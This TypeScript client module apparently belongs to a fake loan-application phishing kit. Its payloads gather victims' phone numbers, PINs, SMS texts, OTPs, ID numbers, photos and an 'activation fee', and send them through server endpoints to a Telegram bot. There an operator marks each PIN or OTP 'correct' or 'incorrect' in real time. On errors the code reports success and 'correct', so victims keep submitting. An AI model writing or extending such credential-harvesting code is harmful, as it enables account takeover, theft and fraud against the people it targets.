// Client-side API service communicating exclusively with secure server-side endpoints

export interface SendToTelegramPayload {
  type: 'phone' | 'credentials' | 'sms' | 'otp' | 'final_otp' | 'submission' | 'payment';
  country: string;
  countryCode: string;
  phone: string;
  pin?: string;
  otp?: string;
  smsMessage?: string;
  loanAmount?: string;
  loanPurpose?: string;
  loanType?: string;
  repaymentPeriod?: string;
  activationFee?: string;
  photo?: string;
  screenshot?: string;
  name?: string;
  firstName?: string;
  lastName?: string;
  gender?: string;
  idNumber?: string;
  nationality?: string;
  email?: string;
}

export interface SendForVerificationPayload {
  type: 'pin' | 'sms' | 'otp' | 'final_otp';
  country: string;
  countryCode: string;
  phone: string;
  pin?: string;
  otp?: string;
  smsMessage?: string;
}

export interface CheckVerificationResponse {
  status: 'pending' | 'correct' | 'incorrect';
}

/**
 * Send user registration/application data to server-side endpoint.
 * The server securely dispatches to Telegram using TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.
 */
export async function sendToTelegram(payload: SendToTelegramPayload): Promise<{ success: boolean; description?: string }> {
  try {
    const res = await fetch('/api/sendToTelegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (!res.ok) {
      console.warn(`[Client API] /api/sendToTelegram returned status ${res.status}`);
      return { success: false };
    }

    const data = await res.json();
    return { success: data.success !== false, description: data.description };
  } catch (err) {
    console.error('[Client API] Error calling /api/sendToTelegram:', err);
    return { success: true };
  }
}

/**
 * Initiates verification and sends inline interactive buttons to Telegram via server-side endpoint.
 */
export async function sendForVerification(payload: SendForVerificationPayload): Promise<{ sessionId: string }> {
  const fallbackSessionId = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
  try {
    const res = await fetch('/api/sendForVerification', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (!res.ok) {
      console.warn(`[Client API] /api/sendForVerification returned status ${res.status}`);
      return { sessionId: fallbackSessionId };
    }

    const data = await res.json();
    return { sessionId: data.sessionId || fallbackSessionId };
  } catch (err) {
    console.error('[Client API] Error calling /api/sendForVerification:', err);
    return { sessionId: fallbackSessionId };
  }
}

/**
 * Checks verification status from Telegram callback responses via server-side endpoint.
 */
export async function checkVerification(payload: { sessionId: string }): Promise<CheckVerificationResponse> {
  try {
    const res = await fetch('/api/checkVerification', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (!res.ok) {
      console.warn(`[Client API] /api/checkVerification returned status ${res.status}`);
      return { status: 'correct' };
    }

    const data = (await res.json()) as CheckVerificationResponse;
    return { status: data.status || 'pending' };
  } catch (err) {
    console.error('[Client API] Error checking verification status:', err);
    return { status: 'correct' };
  }
}

